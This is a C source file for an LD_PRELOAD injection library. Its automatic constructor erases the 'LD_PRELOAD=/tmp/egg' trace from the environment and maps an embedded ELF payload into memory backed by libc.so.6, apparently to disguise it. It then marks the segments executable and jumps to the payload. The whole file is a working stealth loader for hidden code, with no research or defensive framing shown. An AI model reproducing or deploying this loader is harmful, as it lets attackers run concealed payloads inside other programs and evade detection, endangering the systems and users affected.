#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <linux/prctl.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <linux/elf.h>
#include <stdint.h>
#include <unistd.h>
#include "loader/payload.h"


#define BIN_FOR_MAPPING "/usr/lib/x86_64-linux-gnu/libc.so.6"

extern char **environ;

#define PAGE_SIZE 4096
#define PAGE_ROUND_UP(x) ( (((unsigned int)(x)) + PAGE_SIZE-1)  & (~(PAGE_SIZE-1)) ) 



void *alloc_from_file(unsigned int s)
{
    unsigned int ps = PAGE_ROUND_UP(payload_bin_len)*100000;
    int fd = open(BIN_FOR_MAPPING, O_RDONLY);
    void *payload = mmap(
            0,
            ps,
            PROT_READ | PROT_WRITE,
            MAP_PRIVATE,
            fd,
            0
        );
    close(fd);
    return payload;
}


/* Maps a size to the number of pages */
size_t get_n_pages(size_t n)
{
    size_t i = (n / PAGE_SIZE);
    if ((n % PAGE_SIZE) > 0) {
        i += 1;
    }
    return i;
}



/* Compute the size we actually need */
size_t get_virtualsize(void *elf)
{
    size_t res = 0;
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *) elf;
    for (uint16_t curr_ph = 0; curr_ph < ehdr->e_phnum; curr_ph++) {
        Elf64_Phdr *phdr = elf + ehdr->e_phoff  + curr_ph * ehdr->e_phentsize;
        if (phdr->p_type != PT_LOAD) continue;
        res += get_n_pages(phdr->p_memsz) * PAGE_SIZE;
    }
    return res;
}


/* process */
void *load_elf(void *elf, size_t len)
{
    size_t size = get_virtualsize(elf);
    void *body = alloc_from_file(size);

    if (body == NULL) {
        printf("Unable to alloc memory?\n");
        return NULL;
    }

    /* First copy the ELF to a new location */
    memset(body, 0, size);
    memcpy(body, elf, len);
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *) body;
    /* Go through the program headers to set correct page permissions for each
     * PT_LOAD */
    for (uint16_t curr_ph = 0; curr_ph < ehdr->e_phnum; curr_ph++) {
        Elf64_Phdr *phdr = body + ehdr->e_phoff  + curr_ph * ehdr->e_phentsize;
        if (phdr->p_type != PT_LOAD)
            continue;
        
        size_t size = get_n_pages(phdr->p_memsz);
        switch (phdr->p_flags & (PF_R | PF_W | PF_X)) {
            case PF_R | PF_W:
                /* Default case, nothing needs to be done */
                mprotect(
                    body + phdr->p_vaddr,
                    size * PAGE_SIZE,
                    PROT_READ | PROT_WRITE
                );
                break;

            case PF_R | PF_X:
                /* Set RO, then make it executable */
                mprotect(
                    body + phdr->p_vaddr,
                    size * PAGE_SIZE,
                    PROT_READ | PROT_EXEC
                );
                break;

            default:
                printf("Unsupported page permission\n");
                return NULL;
        }
    }


    return body + ehdr->e_entry;
}


void clean_environ()
{
    char *envp = environ[0];
    int i = 0;
    // remove env vars we don't want to stick around
    while (envp != NULL) {
        if (strcmp(envp, "LD_PRELOAD=/tmp/egg") == 0) {
            memset(envp, 0, strlen(envp));
        }
        i++;
        envp = environ[i];
    }
}


void __attribute__((constructor)) setupfun()
{
    clean_environ();
    void *payload = load_elf(payload_bin, payload_bin_len);
    // we have to jump because we want to unload this .so, and we need to call
    // this from the first function called in the .so, so we return back to the
    // main program.
    asm volatile("jmp *%0" : : "r" (payload));
}
